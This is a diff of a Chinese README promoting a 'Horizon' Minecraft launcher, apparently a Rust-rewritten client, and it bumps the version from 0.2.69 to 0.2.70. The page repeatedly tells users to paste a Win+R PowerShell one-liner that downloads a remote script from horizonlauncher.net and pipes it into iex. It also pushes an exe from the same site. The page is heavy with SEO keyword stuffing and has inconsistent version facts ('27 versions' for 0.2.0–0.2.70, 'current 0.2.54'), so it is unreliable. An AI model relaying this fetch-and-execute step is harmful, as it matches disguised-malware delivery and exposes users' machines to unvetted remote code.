@@ -23,7 +23,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 
 <p align="center">
   <strong>最新更新:</strong>
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69">0.2.69</a>
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70">0.2.70</a>
   · <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases">全部更新与补丁</a>
 </p>
 
@@ -64,12 +64,12 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
   <img alt="windows" src="https://img.shields.io/badge/OS-Windows_10%2F11-0078d4">
   <img alt="fps" src="https://img.shields.io/badge/FPS-Rust_client-orange">
   <img alt="free" src="https://img.shields.io/badge/价格-免费-success">
-  <img alt="version" src="https://img.shields.io/badge/Launcher-0.2.69-lightgrey">
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69"><img alt="changelog" src="https://img.shields.io/badge/Changelog-0.2.69-informational"></a>
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases"><img alt="releases" src="https://img.shields.io/badge/Releases-0.2.0_to_0.2.69-blue"></a>
+  <img alt="version" src="https://img.shields.io/badge/Launcher-0.2.70-lightgrey">
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70"><img alt="changelog" src="https://img.shields.io/badge/Changelog-0.2.70-informational"></a>
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases"><img alt="releases" src="https://img.shields.io/badge/Releases-0.2.0_to_0.2.70-blue"></a>
 </p>
 
-<p align="center"><em>更新 2026-11-16：启动器 <strong>0.2.69</strong>，LGPL，Win+R，UAC。 <a href="https://horizonlauncher.net/zh/">horizonlauncher.net</a>.</em></p>
+<p align="center"><em>更新 2026-11-17：启动器 <strong>0.2.70</strong>，LGPL，Win+R，UAC。 <a href="https://horizonlauncher.net/zh/">horizonlauncher.net</a>.</em></p>
 
 [![下载 Horizon Minecraft Rust 版](https://horizonlauncher.net/media/social-preview.jpg)](https://horizonlauncher.net/zh/)
 
@@ -145,10 +145,11 @@ Horizon **不属于** Mojang / Microsoft。请只从 **horizonlauncher.net** 下
 
 Horizon 持续维护，补丁定期发布。每个版本单独成 GitHub Release 并带 changelog。当前安装包在官网，补丁历史在此。
 
-**最新更新:** [0.2.69](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69) · **[全部更新与补丁](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)** — 27 个版本 (0.2.0 → 0.2.69).
+**最新更新:** [0.2.70](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70) · **[全部更新与补丁](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)** — 27 个版本 (0.2.0 → 0.2.70).
 
 | 版本 | 日期 | |
 |---|---|---|
+| **[0.2.70](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70)** | 2026-11-17 | [说明](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70) |
 | **[0.2.69](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69)** | 2026-11-16 | [说明](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69) |
 | **[0.2.68](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.68)** | 2026-11-15 | [说明](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.68) |
 | **[0.2.67](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.67)** | 2026-11-15 | [说明](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.67) |
@@ -164,10 +165,9 @@ Horizon 持续维护，补丁定期发布。每个版本单独成 GitHub Release
 | **[0.2.57](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.57)** | 2026-11-09 | [说明](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.57) |
 | **[0.2.56](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.56)** | 2026-11-08 | [说明](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.56) |
 | **[0.2.55](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.55)** | 2026-11-08 | [说明](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.55) |
-| **[0.2.54](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.54)** | 2026-11-08 | [说明](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.54) |
 
 
-更早版本: [0.2.53](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.53) · [0.2.52](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.52) · [0.2.51](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.51) · [0.2.50](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.50) · [0.2.49](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.49) · [0.2.48](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.48) · [0.2.47](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.47) · [0.2.46](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.46) · [0.2.45](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.45) · [0.2.44](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.44) · [0.2.43](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.43)
+更早版本: [0.2.54](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.54) · [0.2.53](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.53) · [0.2.52](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.52) · [0.2.51](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.51) · [0.2.50](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.50) · [0.2.49](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.49) · [0.2.48](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.48) · [0.2.47](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.47) · [0.2.46](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.46) · [0.2.45](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.45) · [0.2.44](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.44)
 
 
 ## 什么是 Horizon Minecraft
@@ -190,7 +190,7 @@ Horizon 持续维护，补丁定期发布。每个版本单独成 GitHub Release
 
 - Windows 10 / Windows 11 x64
 - `horizon-launcher-setup.exe`
-- Horizon **0.2.69**
+- Horizon **0.2.70**
 - 免费 · 官网为俄语和英语
 
 ## 如何安装 Horizon — 两种方法
@@ -223,7 +223,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 同一个 Horizon 安装包 — 普通文件下载，无需命令。当前：**0.2.54**，Windows x64，约 60 MB。
 
 **[下载 Horizon — Windows setup](https://horizonlauncher.net/horizon-launcher-setup.exe)**  
-`horizon-launcher-setup.exe` · Windows x64 · ~60 MB · v0.2.69
+`horizon-launcher-setup.exe` · Windows x64 · ~60 MB · v0.2.70
 
 1. 下载 [horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)。
 2. 运行 Windows 安装程序。
@@ -287,7 +287,7 @@ Win+R：`irm https://horizonlauncher.net/install.ps1 | iex` · **[horizon-launch
 
 ### 常见搜索
 
-`下载 Horizon Minecraft` · `Horizon 启动器 Windows` · `Horizon 0.2.69` · `Minecraft Rust Edition` · [发布页](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)
+`下载 Horizon Minecraft` · `Horizon 启动器 Windows` · `Horizon 0.2.70` · `Minecraft Rust Edition` · [发布页](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)
 
 ## 常见问题
 
@@ -304,13 +304,13 @@ Win+R：`irm https://horizonlauncher.net/install.ps1 | iex` · **[horizon-launch
 Horizon 的 Rust 客户端不需要。
 
 **什么许可证？**  
-从 **0.2.69** 起，Horizon 上游为 **LGPL-3.0-or-later**。[https://horizonlauncher.net/zh/legal/](https://horizonlauncher.net/zh/legal/)
+从 **0.2.70** 起，Horizon 上游为 **LGPL-3.0-or-later**。[https://horizonlauncher.net/zh/legal/](https://horizonlauncher.net/zh/legal/)
 
 **Distant Horizons、Create 和光影？**  
 支持 — 原生模组 (.hnmod)。[https://horizonlauncher.net/zh/distant-horizons/](https://horizonlauncher.net/zh/distant-horizons/) · [Create](https://horizonlauncher.net/zh/create-mod/) · [光影](https://horizonlauncher.net/zh/shaders/)
 
-**0.2.65–0.2.69 更新？**  
-[Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases) · 启动器 **0.2.69** [https://horizonlauncher.net/zh/](https://horizonlauncher.net/zh/)
+**0.2.65–0.2.70 更新？**  
+[Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases) · 启动器 **0.2.70** [https://horizonlauncher.net/zh/](https://horizonlauncher.net/zh/)
 
 **Windows 7 / macOS / Linux？**  
 安装包仅支持 **Windows 10/11 x64**。详见 [https://horizonlauncher.net/zh/download-horizon/](https://horizonlauncher.net/zh/download-horizon/)。
@@ -334,12 +334,12 @@ Horizon 的 Rust 客户端不需要。
 
 ## English — 下载 Horizon Minecraft launcher
 
-**Horizon** 是免费的 **Windows Minecraft 启动器** 与 **Rust 重写的 Java 客户端**（Minecraft Rust Edition）。英文 canonical 页面：[https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) · **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** · **0.2.69**。非 Mojang/Microsoft 官方产品。
+**Horizon** 是免费的 **Windows Minecraft 启动器** 与 **Rust 重写的 Java 客户端**（Minecraft Rust Edition）。英文 canonical 页面：[https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) · **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** · **0.2.70**。非 Mojang/Microsoft 官方产品。
 
 
 ## SEO 标签与搜索词
 
-`下载 Horizon` `Horizon 启动器` `Rust 版 Minecraft` `Horizon 0.2.69` `horizonlauncher.net` `download Horizon`
+`下载 Horizon` `Horizon 启动器` `Rust 版 Minecraft` `Horizon 0.2.70` `horizonlauncher.net` `download Horizon`
 
 `下载 Horizon` `Horizon 启动器` `Rust 版 Minecraft` `Minecraft Rust Edition` `Minecraft 高帧率` `horizonlauncher.net` `download Horizon` `Win+R Horizon` `Horizon 快速安装` `Horizon 安装包` `下载 Horizon` `Distant Horizons Horizon`
 
